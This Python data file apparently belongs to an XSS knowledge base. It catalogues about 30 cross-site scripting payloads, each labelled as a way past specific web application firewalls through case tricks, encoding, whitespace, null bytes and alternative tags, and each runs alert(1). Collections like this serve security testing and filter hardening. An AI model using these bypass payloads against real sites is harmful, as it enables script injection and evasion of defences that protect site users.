#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Production
Telegram: https://t.me/EasyProTech

WAF Bypass Techniques - Curated Collection
Cloudflare, Akamai, AWS WAF, Imperva, ModSecurity, F5 BIG-IP
"""

from ..models import PayloadEntry

WAF_PERMUTATIONS_PAYLOADS = {
    # === Quote Style Bypasses ===
    "waf_quote_backtick": PayloadEntry(
        payload="<img src=x onerror=alert`1`>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Template literal backticks instead of parentheses bypass WAF regex expecting alert()",
        tags=["waf-bypass", "quotes", "backtick", "template-literal"],
        reliability="high",
        waf_evasion=True,
        browser_support=["chrome", "firefox", "edge", "safari"],
        bypasses=["cloudflare", "akamai", "modsecurity"]
    ),
    "waf_quote_none": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="No quotes around attribute values - valid HTML5, bypasses quote-based regex",
        tags=["waf-bypass", "quotes", "unquoted"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"]
    ),

    # === Case Sensitivity Bypasses ===
    "waf_case_mixed_script": PayloadEntry(
        payload="<ScRiPt>alert(1)</sCrIpT>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Mixed case tag names bypass case-sensitive WAF rules",
        tags=["waf-bypass", "case", "mixed-case"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        bypasses=["modsecurity-crs2"]
    ),
    "waf_case_mixed_event": PayloadEntry(
        payload="<img src=x OnErRoR=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Mixed case event handler bypasses lowercase-only regex",
        tags=["waf-bypass", "case", "event-handler"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"]
    ),

    # === Whitespace/Newline Bypasses ===
    "waf_newline_tag": PayloadEntry(
        payload="<svg\nonload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Newline between tag and attribute bypasses single-line regex",
        tags=["waf-bypass", "whitespace", "newline"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        bypasses=["cloudflare", "imperva"]
    ),
    "waf_tab_separator": PayloadEntry(
        payload="<img\tsrc=x\tonerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Tab characters as attribute separators bypass space-based regex",
        tags=["waf-bypass", "whitespace", "tab"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"]
    ),
    "waf_formfeed": PayloadEntry(
        payload="<img\x0csrc=x\x0conerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form feed (0x0C) as whitespace bypass - rarely filtered",
        tags=["waf-bypass", "whitespace", "formfeed", "exotic"],
        reliability="medium",
        waf_evasion=True,
        browser_support=["chrome", "firefox"]
    ),

    # === Slash/Self-Closing Bypasses ===
    "waf_slash_before_attr": PayloadEntry(
        payload="<svg/onload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Slash before attribute name - valid in HTML5, bypasses space requirement",
        tags=["waf-bypass", "slash", "self-closing"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        bypasses=["cloudflare", "akamai", "aws-waf"]
    ),
    "waf_slash_in_tag": PayloadEntry(
        payload="<img/src=x/onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Multiple slashes as attribute separators",
        tags=["waf-bypass", "slash", "separator"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"]
    ),

    # === Encoding Bypasses ===
    "waf_double_url_encode": PayloadEntry(
        payload="%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        contexts=["url"],
        severity="high",
        cvss_score=8.0,
        description="Double URL encoding bypasses single-decode WAF inspection",
        tags=["waf-bypass", "encoding", "double-encode", "url"],
        reliability="high",
        waf_evasion=True,
        bypasses=["cloudflare", "akamai"],
        encoding="double-url"
    ),
    "waf_html_entity_decimal": PayloadEntry(
        payload="<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML decimal entities for function name bypass",
        tags=["waf-bypass", "encoding", "html-entity", "decimal"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        encoding="html-decimal"
    ),
    "waf_html_entity_hex": PayloadEntry(
        payload="<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML hex entities for function name bypass",
        tags=["waf-bypass", "encoding", "html-entity", "hex"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        encoding="html-hex"
    ),
    "waf_unicode_escape": PayloadEntry(
        payload="<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="JavaScript Unicode escapes for keyword bypass",
        tags=["waf-bypass", "encoding", "unicode", "javascript"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        encoding="unicode"
    ),

    # === Comment Injection Bypasses ===
    "waf_html_comment_split": PayloadEntry(
        payload="<scr<!--comment-->ipt>alert(1)</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML comment inside tag name - browsers ignore, WAF may not",
        tags=["waf-bypass", "comment", "split"],
        reliability="medium",
        waf_evasion=True,
        browser_support=["ie", "edge-legacy"]
    ),
    "waf_js_comment_newline": PayloadEntry(
        payload="<script>al//comment\nert(1)</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="JavaScript single-line comment with newline continuation",
        tags=["waf-bypass", "comment", "javascript", "newline"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"]
    ),

    # === Null Byte Bypasses ===
    "waf_null_byte_tag": PayloadEntry(
        payload="<scr\x00ipt>alert(1)</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Null byte in tag name - may terminate WAF string processing",
        tags=["waf-bypass", "null-byte", "truncation"],
        reliability="medium",
        waf_evasion=True,
        browser_support=["ie", "edge-legacy"],
        bypasses=["modsecurity", "f5"]
    ),

    # === Protocol Handler Bypasses ===
    "waf_javascript_entity": PayloadEntry(
        payload="<a href=j&#97;vascript:alert(1)>click</a>",
        contexts=["html_content", "href"],
        severity="high",
        cvss_score=7.5,
        description="HTML entity in javascript: protocol bypasses keyword filter",
        tags=["waf-bypass", "protocol", "javascript", "entity"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"]
    ),
    "waf_javascript_newline": PayloadEntry(
        payload="<a href=java\nscript:alert(1)>click</a>",
        contexts=["html_content", "href"],
        severity="high",
        cvss_score=7.5,
        description="Newline in javascript: protocol keyword",
        tags=["waf-bypass", "protocol", "javascript", "newline"],
        reliability="medium",
        waf_evasion=True,
        browser_support=["chrome", "firefox"]
    ),
    "waf_data_uri_base64": PayloadEntry(
        payload="<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>",
        contexts=["html_content", "href"],
        severity="high",
        cvss_score=7.5,
        description="Base64 encoded data: URI bypasses content inspection",
        tags=["waf-bypass", "protocol", "data-uri", "base64"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        encoding="base64"
    ),

    # === Alternative Tags Bypasses ===
    "waf_svg_animate": PayloadEntry(
        payload="<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="SVG animate element with onbegin - less commonly filtered",
        tags=["waf-bypass", "svg", "animate", "onbegin"],
        reliability="high",
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"]
    ),
    "waf_svg_set": PayloadEntry(
        payload="<svg><set onbegin=alert(1) attributeName=x to=y>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="SVG set element with onbegin event",
        tags=["waf-bypass", "svg", "set", "onbegin"],
        reliability="high",
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"]
    ),
    "waf_math_xlink": PayloadEntry(
        payload="<math><maction xlink:href=javascript:alert(1)>click</maction></math>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="MathML maction with xlink:href for javascript: execution",
        tags=["waf-bypass", "mathml", "xlink", "maction"],
        reliability="medium",
        waf_evasion=True,
        browser_support=["firefox"]
    ),
    "waf_details_ontoggle": PayloadEntry(
        payload="<details open ontoggle=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 details element with ontoggle - newer event, less filtered",
        tags=["waf-bypass", "html5", "details", "ontoggle"],
        reliability="high",
        waf_evasion=True,
        browser_support=["chrome", "firefox", "edge", "safari"]
    ),

    # === Cloudflare Specific ===
    "waf_cloudflare_constructor": PayloadEntry(
        payload="<img src=x onerror=window['al'+'ert'](1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="String concatenation to bypass Cloudflare alert() detection",
        tags=["waf-bypass", "cloudflare", "concatenation"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        bypasses=["cloudflare"]
    ),
    "waf_cloudflare_eval": PayloadEntry(
        payload="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Base64 encoded payload with eval(atob()) for Cloudflare bypass",
        tags=["waf-bypass", "cloudflare", "eval", "atob", "base64"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        bypasses=["cloudflare"],
        encoding="base64"
    ),

    # === Akamai Specific ===
    "waf_akamai_fromcharcode": PayloadEntry(
        payload="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="String.fromCharCode() encoding for Akamai bypass",
        tags=["waf-bypass", "akamai", "fromcharcode"],
        reliability="high",
        waf_evasion=True,
        browser_support=["all"],
        bypasses=["akamai"],
        encoding="other"
    ),

    # === AWS WAF Specific ===
    "waf_aws_unicode_normalization": PayloadEntry(
        payload="<img src=x onerror=\uff41\uff4c\uff45\uff52\uff54(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Fullwidth Unicode characters bypass AWS WAF normalization",
        tags=["waf-bypass", "aws-waf", "unicode", "fullwidth"],
        reliability="medium",
        waf_evasion=True,
        browser_support=["chrome", "firefox"],
        bypasses=["aws-waf"],
        encoding="unicode"
    ),

    # === ModSecurity CRS Specific ===
    "waf_modsecurity_paranoia": PayloadEntry(
        payload="<img src=valid.jpg onerror=alert(1) alt=test>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Valid-looking attributes before onerror may bypass low paranoia levels",
        tags=["waf-bypass", "modsecurity", "crs", "paranoia"],
        reliability="medium",
        waf_evasion=True,
        browser_support=["all"],
        bypasses=["modsecurity-crs"]
    ),
}

WAF_PERMUTATIONS_TOTAL = len(WAF_PERMUTATIONS_PAYLOADS)
